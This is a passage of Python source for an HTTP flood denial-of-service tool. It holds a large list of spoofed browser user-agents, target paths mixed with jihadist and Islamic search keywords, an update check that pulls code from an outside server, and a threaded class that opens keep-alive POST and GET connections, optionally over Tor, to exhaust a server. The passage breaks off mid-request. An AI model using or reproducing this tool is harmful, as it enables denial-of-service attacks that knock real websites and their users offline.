"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; pl-pl) AppleWebKit/312.8 (KHTML, like Gecko, Safari) DeskBrowse/1.0"
"Dillo/2.0"
"Dillo/0.8.6-i18n-misc"
"Dooble/0.07 (de_CH) WebKit"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ (KHTML, like Gecko) Element Browser 5.0"
"ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)"
"ELinks/0.12~pre2.dfsg0-1ubuntu1 (textmode; Debian; Linux 2.6.28-15-generic x86_64; 207x60-2)"
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.13) Gecko/2009073022 EnigmaFox/3.0.13"
"Mozilla/5.0 (X11; U; Linux x86_64; it-it) AppleWebKit/534.26+ (KHTML, like Gecko) Ubuntu/11.04 Epiphany/2.30.6"
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.14) Gecko/20080528 Ubuntu/9.10 (karmic) Epiphany/2.22 Firefox/3.0"
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.8) Gecko/20080528 Fedora/2.24.3-4.fc10 Epiphany/2.22 Firefox/3.0"
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 (Debian/2.24.3-2)"
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9) Gecko/20080528 (Gentoo) Epiphany/2.22 Firefox/3.0"
"Mozilla/5.0 (X11; U; FreeBSD i386; en; rv:1.8.1.12) Gecko/20080213 Epiphany/2.20 Firefox/2.0.0.12"
"Mozilla/4.0 (compatible; MSIE 5.23; Macintosh; PPC) Escape 5.1.8"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; x64; fr; rv:1.9.2.13) Gecko/20101203 Firebird/3.6.13"
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.5) Gecko/20031007 Firebird/0.7"
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.5) Gecko/20031026 Firebird/0.7"
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.5a) Gecko/20030729 Mozilla Firebird/0.6.1"
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.5) Gecko/20031007 Firebird/0.7"
"Mozilla/5.0 (Windows; U; Win95; en-US; rv:1.5) Gecko/20031007 Firebird/0.7"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Flock/3.5.3.4628 Chrome/7.0.517.450 Safari/534.7"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Flock/3.5.2.4599 Chrome/7.0.517.442 Safari/534.7"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Flock/3.5.0.4568 Chrome/7.0.517.440 Safari/534.7"
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6"
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en-US; rv:1.9.0.16) Gecko/2010010314 Firefox/3.0.16 Flock/2.5.6"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; nl-nl) AppleWebKit/532.3+ (KHTML, like Gecko) Fluid/0.9.6 Safari/532.3+"
"Galaxy/1.0 [en] (Mac OS X 10.5.6; U; en)"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.10) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2.1)"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.7) Gecko Galeon/2.0.6 (Debian 2.0.6-2.1)"
"Mozilla/5.0(X11;U;Linux(x86_64);en;rv:1.9a8)Gecko/2007100619;GranParadiso/3.1"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a7) Gecko/2007080210 GranParadiso/3.0a7"
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.9a1) Gecko/20061204 GranParadiso/3.0a1"
"Mozilla/5.0 (X11; U; Darwin i386; en-US; rv:1.9.0.8) Gecko/2009040414 GranParadiso/3.0.8"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506; Media Center PC 5.0; .NET CLR 3.5.21022; GreenBrowser)"
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko) Hana/1.1"
"Mozilla/5.0 (Macintosh; U; i386 Mac OS X; en) AppleWebKit/417.9 (KHTML, like Gecko) Hana/1.0"
"HotJava/1.1.2 FCS"
"HotJava/1.0.1/JRE1.1.x"
"IBM WebExplorer /v0.94"
"Mozilla/5.0 (compatible; IBrowse 3.0; AmigaOS4.0)"
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/537.3+ (KHTML, like Gecko) iCab/5.0 Safari/533.16"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8"
"Mozilla/5.0 (X11; U; Linux sparc64; es-PY; rv:5.0) Gecko/20100101 IceCat/5.0 (like Firefox/5.0; Debian-6.0.1)"
"Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1 Iceweasel/15.0.1"
"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0"
"Mozilla/4.0 (compatible; MSIE 2.0; Windows NT 5.0; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; iRider 2.60.0008; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1250.0 Iron/22.0.2150.0 Safari/537.4"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.21pre) Gecko K-Meleon/1.7.0"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4pre) Gecko/20070404 K-Ninja/2.1.3"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.0.1) Gecko/20080722 Firefox/3.0.1 Kapiko/3.0"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; KKMAN3.2; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C)"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081217 KMLite/1.1.2"
"Mozilla/5.0 (X11; Linux 3.5.4-1-ARCH i686; es) KHTML/4.9.1 (like Gecko) Konqueror/4.9"
"Mozilla/5.0 (X11; U; Linux x86_64; ru-RU) AppleWebKit/533.3 (KHTML, like Gecko) Leechcraft/0.4.55-13-g2230d9f Safari/533.3"
"Links (6.9; Unix 6.9-astral sparc; 80x25)"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows XP 5.1) Lobo/0.98.4"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070225 lolifox/0.32"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3pre) Gecko/20100403 Lorentz/3.6.3plugin2pre (.NET CLR 4.0.20506)"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Lunascape 6.7.1.25446)"
"Lynx/2.8.7rel.2 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.0.0a"
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en; rv:1.7.12) Gecko/20050928 Firefox/1.0.7 Madfox/3.0"
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1"
"Mozilla/5.0 (X11; U; Linux i686; fr-fr) AppleWebKit/525.1+ (KHTML, like Gecko, Safari/525.1+) midori/1.19"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; MyIE2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; WinFX RunTime 3.0.50727)"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2a2pre) Gecko/20090908 Ubuntu/9.04 (jaunty) Namoroka/3.6a2pre GTB5 (.NET CLR 3.5.30729)"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR) AppleWebKit/534.8 (KHTML, like Gecko) Navscape/Pre-0.2 Safari/534.8"
"NCSA_Mosaic/2.7b4 (X11;AIX 1 000180663000)"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; de-de) AppleWebKit/531.22.7 (KHTML, like Gecko) NetNewsWire/3.2.7"
"Mozilla/3.0 (compatible; NetPositive/2.2.2; BeOS)"
"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285"
"NetSurf/2.0 (RISC OS; armv5l)"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941"
"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; x64; fr; rv:1.9.1.1) Gecko/20090722 Firefox/3.5.1 Orca/1.2 build 2"
"Mozilla/1.10 [en] (Compatible; RISC OS 3.70; Oregano 1.10)"
"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/146.1 (KHTML, like Gecko) osb-browser/0.5"
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:15.0) Gecko/20120919 Firefox/15.1.1-x64 PaleMoon/15.1.1-x64"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3a) Gecko/20021207 Phoenix/0.5"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080414 Firefox/2.0.0.13 Pogo/2.0.0.13.6866"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.3) Gecko/20100402 Prism/1.0b4"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR) AppleWebKit/533.3 (KHTML, like Gecko) QtWeb Internet Browser/3.7 http://www.QtWeb.net"
"Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ) AppleWebKit/533.3 (KHTML, like Gecko) rekonq Safari/533.3"
"retawq/0.2.6c [en] (text)"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24"
"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
"Mozilla/5.0 (Windows NT 5.2; RW; rv:7.0a1) Gecko/20091211 SeaMonkey/9.23a1pre"
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/419 (KHTML, like Gecko) Shiira/1.2.3 Safari/125"
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b5pre) Gecko/20090519 Shiretoko/3.5b5pre"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618; .NET4.0C; .NET4.0E; Sleipnir/2.9.9)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; SlimBrowser)"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.16 (KHTML, like Gecko) Stainless/0.5.3 Safari/525.20.1"
"Sundance/0.9x(Compatible; Windows; U; en-US;)Version/0.9x"
"Mozilla/6.0 (X11; U; Linux x86_64; en-US; rv:2.9.0.3) Gecko/2009022510 FreeBSD/ Sunrise/4.0.1/like Safari"
"Surf/0.4.1 (X11; U; Unix; en-US) AppleWebKit/531.2+ Compatible (Safari; MSIE 9.0)"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.9) Gecko/20071110 Sylera/3.0.20 SeaMonkey/1.1.6"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; TencentTraveler 4.0; Trident/4.0; SLCC1; Media Center PC 5.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10.5; rv:10.0.2) Gecko/20120216 Firefox/10.0.2 TenFourFox/7450"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; TheWorld)"
"Uzbl (Webkit 1.3) (Linux i686 [i686])"
"Vimprobable/0.9.20.5"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1pre) Gecko/20090629 Vonkeror/1.0"
"w3m/0.52"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR) AppleWebKit/534.12 (KHTML, like Gecko) WeltweitimnetzBrowser/0.25 Safari/534.12"
"WorldWideweb (NEXT)"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20100121 Firefox/3.5.6 Wyzo/3.5.6.1"
"Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9"
"Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari"
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile"
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows 95; PalmSource; Blazer 3.0) 16; 160x160"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.340) AppleWebKit/530+ (KHTML, like Gecko) Version/4.0 Safari/530.17 UNTRUSTED/1.0 3gpp-gba"
"SamsungI8910/SymbianOS/9.1 Series60/3.0"
"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/20.0.042; Profile/MIDP-2.1 Configuration/CLDC-1.1; zh-hk) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.2.6.9 3gpp-gba"
"NokiaC6-00/10.0.021 (SymbianOS/9.4; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) BrowserNG/7.2.6 UNTRUSTED/1.0 3gpp-gba"
"NokiaN97/21.1.107 (SymbianOS/9.4; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) BrowserNG/7.1.4"
"NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba"
"Doris/1.15 [en] (Symbian)"
"Mozilla/5.0 (Windows; U; Windows CE; Mobile; like iPhone; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3 Dorothy"
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0"
"NokiaE66/GoBrowser/2.0.297"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"
"Mozilla/5.0 (Windows NT; U; en) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Iris/1.1.7 Safari/525.20"
"MOT-L7/NA.ACR_RB MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025"
"SAMSUNG-C5212/C5212XDIK1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54"
"Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02"
"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/418.9.1 (KHTML, like Gecko) Safari/419.3 TeaShark/0.8"
"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_USA)",
]

getss = [
        '3b42huhbreiuhbiuvhe4iruhotvbuher4it',
        'nv249u5h982h4359htr93w847thgf983w4heptofwhg98t43',
        'vi0542jnbvjn4ihb495ngvi84jhntgoiejg9oe',
        'gj4509ijhg48590hgrehghrengi8hre4ghw8r4hygi8hgregi89e4',
        'fnewvuiqwehbvcuiqwhfqh3wuiefbghiwqEFBNLIQWE',
        'vhedriuvheuoirohv8743hv78345hruygewo',
        '35684eb8ecw4rb84wrtb',
        'ebewrbwrteb78',
        'q5erg',
        'qejgho3iu4ohg3u4ih',
        'ejhgwuihoewuighvuivhduifbhvui',
        '57e5bge74g85',
        'wg54iheiorhgeu864br86574tbhr4ht65',
        'h6rt4hn68r4tehb68ec4bh68dsb4d68rt',
        'g4ewrv5b4e6r58tb4e6rt4b8',
        'index.php',
        'index',
        'contact.php',
        'contact',
        'about.php',
        'about-us.php',
        'about-us',
        'index.html',
        'index.htm',
        'robots.txt',
        'weg54g4eg4ewghtwewrthr5ytjhnetjhwrtj6',
        '~/var/www/index.php',
        'weij98h34v5iu9hevh98u32hgvuh9ieqrv',
        'wbgiuehbovgu3bvuiberfjhvbeqibvlkiuerg',
        'vejnlvoiuerlvneriv685463498446nrewtn',
        'brwt56b4ry65jn4rjtnertj45yt4h/km5747nyu',
        'eovnjpq49834u39483h10gfh',
        '245gho23u7vhqerhv8q9whefoq4398',
        'ciuqwhvc9q384hvnbiuswnc93982u40hfsdoi',
        '34f445h442he4trhrtdhwtr4derhdre',
        'fweqhfiu3h4fhwq8hfwghfeiudeiurh',
        'a',
        'abandon',
        'abandoned',
        'ability',
        'able',
        'about',
        'above',
        'abroad',
        'absence',
        'absent',
        'absolute',
        'absolutely',
        'absorb',
        'abuse',
        'abuse',
        'academic',
        'accent',
        'accept',
        'acceptable',
        'access',
        'accident',
        'accidental',
        'accidentally',
        'accommodation',
        'accompany',
        'according',
        'account',
        'account',
        'accurate',
        'accurately',
        'accuse',
        'achieve',
        'achievement',
        'vb/index.php',
        'vb/main.php',
        'vb/read.php',
        'vb/down.php',
        'vb/contact.php',
        'acid',
        'acknowledge',
        'couple',
        'acquire',
        'across',
        'act',
        'action',
        'active',
        'actively',
        'activity',
        'actor',
        'actress',
        'actual',
        'actually',
        'ad',
        'adapt',
        'add',
        'addition',
        'additional',
        'add',
        'address',
        'add',
        'up',
        'adequate',
        'adequately',
        'adjust',
        'admiraion',
        'admire ',
        'admit ',
        'adopt ',
        'adult',
        'advance',
        'advanced',
        'advantage',
        'adventure',
        'advert',
        'advertise',
        'advertisement',
        'advertising',
        'advice',
        'advise',
        'affair',
        'affect',
        'affection',
        'afford',
        'afraid',
        'after',
        'afternoon',
        'afterwards',
        'again',
        'against',
        'age',
        'aged',
        'agency',
        'agent',
        'aggressive',
        'ago',
        'agree',
        'agreement',
        'ahead',
        'aid',
        'aim',
        'air',
        'aircraft',
        'airport',
        'alarm',
        'alarmed',
        'isis',
        'jihad',
        'mujahid',
        'mujahideen',
        'main',
        'main.php',
        'main.html',
        'site.css',
        'mysite.css',
        'pretty.css',
        'home.php',
        'article.php?id=',
        'article',
        'news',
        'news.php?id=',
        'read',
        'read.php?id=',
        'forums',
        'forum',
        'info',
        'info.php?id=',
        '?id=',
        '?pid=',
        '?news=',
        'home',
        'hijrah',
        'baqiyah',
        'khilafah',
        'kahlifiah',
        'kalifa',
        'caliphate',
        'kahlifa',
        'sucession',
        'hajj',
        'islam',
        'is',
        'prayer',
        'religion',
        'gov',
        'terror',
        'jihad',
        'jihadi',
        'fajr',
        'jihadists',
        'jihadist',
        'salah',
        'koran',
        'quaran',
        'akhi',
        'ummah',
        'akhawan',
        'ameen',
        '?s=qeghq435rhe45j56',
        '?s=5j4567567edrfhret65uyh64u7h',
        '?s=42w5h2h2',
        '?s=758lk578l',
        '?s=76k467ket',
        '?s=456jh465j',
        '?s=5h243h52',
        '?s=5eh454e4',
        '?s=56ewjrw56',
        '?s=7k6478k6t',
        '?s=56j647',
        '?s=rewgw45hw45',
        '?s=56j867k58',
        '?s=36jnh57y6j',
        '?s=4b4t56nh567',
        '?s=5jt4yj65',
        '?s=34grqerg',
        '?s=h5rge3qhgq3wr5hy',
        '?s=245h42qerhg5r',
        '?s=qerg45g456h',
        '?s=w4e5gewrg',
        '?s=g24e3grgerg',
        '?s=ewrgerg54g',
        '?s=5rhrethwerg',
        '?s=gre34grth5yh',
        '?s=qegr34g3er',
        '?s=ergbg3245g',
        '?s=grebgeqrgvb',
        '?s=qe34g35g23g243g',
        '?s=ergergergewrg',
]

term = terminal.TerminalController()



update = False
versionSource = 'v8.2103.3'
    
updateSource = urllib.urlopen("http://opbeast.net/bsdtver.txt")
updateContents = updateSource.read() 

if updateContents != versionSource:
    print  "There is an update available for this tool."
    update = True


def updateMainFile():
    os.system('echo Your Current Version is '+versionSource+' which is out of date.')
    os.system('mkdir '+updateContents)
    os.system('cd '+updateContents)
    os.system('git clone https://github.com/AnonBinarySecurity/'+updateContents+'/ '+updateContents)
    os.system('echo Your tool has been updated, please run this command to get to the proper directory. ')
    os.system('echo ')
    os.system('echo vvvvvvvvvvvv')
    os.system('echo cd '+updateContents)
    os.system('echo ^^^^^^^^^^^^')

class httpPost(threading.Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        ssl.wrap_socket(self.socks, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="ADH-AES256-SHA")
        self.tor = tor
        self.running = True
        bytes = "X"*65500
        bytes2 = "X"*300
		
    def _send_http_post(self, pause=10):
        global stop_now

        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                        (self.host, random.choice(useragents)))

        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
	    p = random.choice(string.letters+string.digits)
	    r = random.choice(string.letters+string.digits)
	    s = random.choice(string.letters+string.digits)
	    t = random.choice(string.letters+string.digits)
	    u = random.choice(string.letters+string.digits)
	    v = random.choice(string.letters+string.digits)
	    print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
	    print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % r+term.NORMAL
	    print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % s+term.NORMAL
            print term.BOL+term.UP+term.CLEAR_EOL+"Requesting Page : %s" % random.choice(getss)+term.NORMAL
	    print term.BOL+term.UP+term.CLEAR_EOL+"Sending: %s packetsize." % randomint+term.NORMAL
	    print term.BOL+term.UP+term.CLEAR_EOL+"Sending: %s packetsize." % randomint+term.NORMAL
	    print term.BOL+term.UP+term.CLEAR_EOL+"Sending: %s packetsize." % randomint+term.NORMAL
 
	    self.socks.send(p)
	    self.socks.send(r)
            self.socks.send(s)
                        

            self.socks.send("GET /%r HTTP/1.1\r\n"
			    "Host: %s\r\n"
			    "User-Agent: %s\r\n" "Referer: curl/7.30.0\r\n"
			    "Cache-Control: no-cache, max-age=0\r\n"
			    "Content-Length: 10000\r\n"
			    "Connection: keep-alive\r\n"  
			    "Keep-Alive: 60\r\n" 
                            "Accept-Ranges: bytes\r\n" 
